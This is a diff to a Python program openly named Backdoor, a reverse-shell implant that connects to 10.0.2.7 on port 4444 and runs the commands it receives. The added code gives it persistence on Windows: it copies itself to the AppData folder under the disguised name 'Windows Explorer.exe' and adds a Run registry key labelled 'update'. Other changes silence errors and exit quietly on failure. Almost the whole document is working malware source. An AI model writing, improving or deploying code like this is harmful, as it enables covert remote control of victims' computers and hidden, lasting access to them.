@@ -1,13 +1,19 @@
 #!/usr/bin/env python
 import socket,json
 import subprocess,os,base64
-
+import sys,shutil
 class Backdoor:
 	"""Backdoor"""
 	def __init__(self, ip,port):
+		self.become_persistent()
 		self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 		self.connection.connect((ip,port))
 
+	def become_persistent(self):
+		evil_file_location=os.environ["appdata"]+"\\Windows Explorer.exe"
+		if not os.path.exists(evil_file_location):	
+			shutil.copyfile(sys.executable,evil_file_location)
+			subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "'+evil_file_location+'"',shell=True)
 	def reliable_send(self,data):
 		json_data=json.dumps(data)
 		self.connection.send(json_data)
@@ -29,13 +35,14 @@ class Backdoor:
 		json_data=""
 		while True:
 			try:
-				json_data=json_data+self.connection.recv(1024)
+				json_data=json_data+str(self.connection.recv(1024))
 				return json.loads(json_data)
 			except ValueError:
 				continue
 		
 	def execute_system_command(self,command):
-		return subprocess.check_output(command,shell=True)
+		DEVNULL = open(os.devnull,'wb')
+		return subprocess.check_output(command,shell=True,stderr=DEVNULL,stdin=DEVNULL)
 	
 	def run(self):
 		while True:
@@ -43,7 +50,7 @@ class Backdoor:
 			try:
 				if rec[0]=="exit":
 					self.connection.close()
-					exit()
+					sys.exit()
 				elif rec[0]=="cd" and len(rec)>1:
 					command_res = self.change_working_directory(rec[1])
 				elif rec[0]=="download":
@@ -54,8 +61,11 @@ class Backdoor:
 					command_res = self.execute_system_command(rec)
 				
 			except Exception:
-				command_res="[-] Error while execution."
+				command_res="[-] Error while execution"
 			self.reliable_send(command_res)
 
-my_backdoor = Backdoor("10.0.2.7",4444)
-my_backdoor.run()
+try:
+    my_backdoor = Backdoor("10.0.2.7",4444)
+    my_backdoor.run()
+except Exception:
+    sys.exit()
